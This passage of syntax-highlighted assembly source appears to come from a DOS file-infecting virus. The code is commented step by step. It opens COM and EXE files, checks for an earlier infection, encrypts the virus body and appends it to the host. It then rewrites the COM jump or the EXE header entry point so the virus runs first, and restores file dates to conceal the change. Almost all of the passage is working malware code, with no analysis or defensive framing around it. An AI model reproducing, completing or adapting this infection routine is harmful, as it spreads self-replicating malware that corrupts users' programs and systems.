  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; fubarize the attributes</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                        </span><span class="sc1">; if there was an error while writing to the</span><span class="sc0">
                                  </span><span class="sc1">; disk we cancel the infection</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; open the file at DS:DX</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">

  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; BX = filehandle</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; DS = ES = CS</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                    </span><span class="sc1">; get file time/date</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">; save file time</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; and date</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; read from file</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">                      </span><span class="sc1">; 1Ch bytes</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; to header</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; can't read from file? then close it...</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">                      </span><span class="sc1">; less then 1ch bytes read?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                       </span><span class="sc1">; then close it too...</span><span class="sc0">


  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">  </span><span class="sc1">; does the header begin with 'ZM'?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect_exe</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">; does the header begin with 'MZ'?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect_exe</span><span class="sc0">

 </span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; no MZ/ZM? then it must be a com...</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                    </span><span class="sc1">; set filepointer to the end</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; save filesize</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">; decrease it by ('virussize'+3+7)</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; and compare that value with the 2nd byte</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; in the header. (restore filesize)</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                          </span><span class="sc1">; if they match, the file is already</span><span class="sc0">
                                    </span><span class="sc1">; infected.</span><span class="sc0">

  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; if not already infected, we calculate</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">new_jump</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; a new jump,</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">state</span><span class="sc4">],</span><span class="sc5">com</span><span class="sc0">      </span><span class="sc1">; and change the 'state' to COM.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                      </span><span class="sc1">; seeks to EOF - 7 (beginning of ENUNSxx)</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">7</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                        </span><span class="sc1">; read the enuns into a buffer</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">enuns</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">enuns</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">  </span><span class="sc1">; add the virus's size + 7</span><span class="sc0">
                                                  </span><span class="sc1">; to the word at the end of</span><span class="sc0">
                                                  </span><span class="sc1">; enuns.</span><span class="sc0">

  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                      </span><span class="sc1">; this gets a new en/decryption key, and</span><span class="sc0">
                                    </span><span class="sc1">; encrypts the whole virus from</span><span class="sc0">
                                    </span><span class="sc1">; xor_crypt_start till the_end and stores</span><span class="sc0">
                                    </span><span class="sc1">; the encrypted code at the_end.</span><span class="sc0">

  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">append</span><span class="sc0">                       </span><span class="sc1">; append the virus to the end of the file.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">; also add the ENUNSxx to the end of</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">enuns</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; COM files, this makes winblows 95 com</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                          </span><span class="sc1">; files functioning again :)</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                      </span><span class="sc1">; go to the beginning of the file</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">; and write the new jump over the first</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">new_jump</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; 3 byte.</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                                    </span><span class="sc1">;;;;</span><span class="sc0">

  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                         </span><span class="sc1">; jump over the exe infection routine to</span><span class="sc0">
                                    </span><span class="sc1">; close the file.</span><span class="sc0">


 </span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; the marker was either ZM or MZ so it</span><span class="sc0">
                                    </span><span class="sc1">; must be an exe file</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'XV'</span><span class="sc0">  </span><span class="sc1">; check for the infection marker at</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                              </span><span class="sc1">; offset 12h in the exe header, if</span><span class="sc0">
                                        </span><span class="sc1">; its already there we close the file.</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; check for new exe files. if the</span><span class="sc0">
  </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                             </span><span class="sc1">; offset of the relocation table entry</span><span class="sc0">
                                        </span><span class="sc1">; is above or equal 40h it is probably</span><span class="sc0">
                                        </span><span class="sc1">; a new exe file and we close it.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'XV'</span><span class="sc0">  </span><span class="sc1">; set infection marker</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">state</span><span class="sc4">],</span><span class="sc5">exe</span><span class="sc0">        </span><span class="sc1">; change state to EXE</span><span class="sc0">

                                        </span><span class="sc1">; save important fields from the</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; header:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; offset 14h - initial IP</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; offset 16h - initial CS</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; offset 0eh - initial SS</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_sp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; offset 10h - initial SP</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                        </span><span class="sc1">; seek to the end of the file</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; save the filesize</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">; overlay check, get the filesize in 512</span><span class="sc0">
  </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; byte pages</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_remainder2</span><span class="sc0">                    </span><span class="sc1">; if there is a remainder in DX</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; increase AX</span><span class="sc0">
 </span><span class="sc5">no_remainder2</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; if DX matches offset 2 of the exe hdr</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                           </span><span class="sc1">; and if AX matches offset 4 there are</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; no overlays, if there are overlays we</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                           </span><span class="sc1">; have to close the file.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; restore filesize in DX:AX</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                             </span><span class="sc1">; save filesize again, some</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                             </span><span class="sc1">; optimizations would be nice here :^)</span><span class="sc0">

  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">              </span><span class="sc1">; add virus size to filesize</span><span class="sc0">
  </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">; convert it to 512 byte pages</span><span class="sc0">
  </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; as always, if there is a remainder in</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_remainder</span><span class="sc0">                     </span><span class="sc1">; DX we have to increase AX.</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">no_remainder</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; save the new filesize at offset 4 and</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; 2 in the exe header.</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">; restore filesize, again</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                           </span><span class="sc1">; at this time convert it to 16 byte</span><span class="sc0">
  </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; paragraphs</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; substract the headersize from it, so</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">; we get the new CS:IP in AX:DX</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; save CS</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; save IP</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; save SS (= CS)</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">0fffeh</span><span class="sc0">  </span><span class="sc1">; save SP</span><span class="sc0">

  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                      </span><span class="sc1">; encrypts the virus and stores it at</span><span class="sc0">
                                    </span><span class="sc1">; the_end.</span><span class="sc0">

  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">append</span><span class="sc0">                       </span><span class="sc1">; append the virus at the end of the file.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                      </span><span class="sc1">; seek to the beginning</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">; replace the exe header with the new one.</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                                    </span><span class="sc1">;;;;</span><span class="sc0">

 </span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; restore stuff like file time/date,</span><span class="sc0">
                                    </span><span class="sc1">; attribs and then close it.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                        </span><span class="sc1">; restore the saved file time and date</span><span class="sc0">
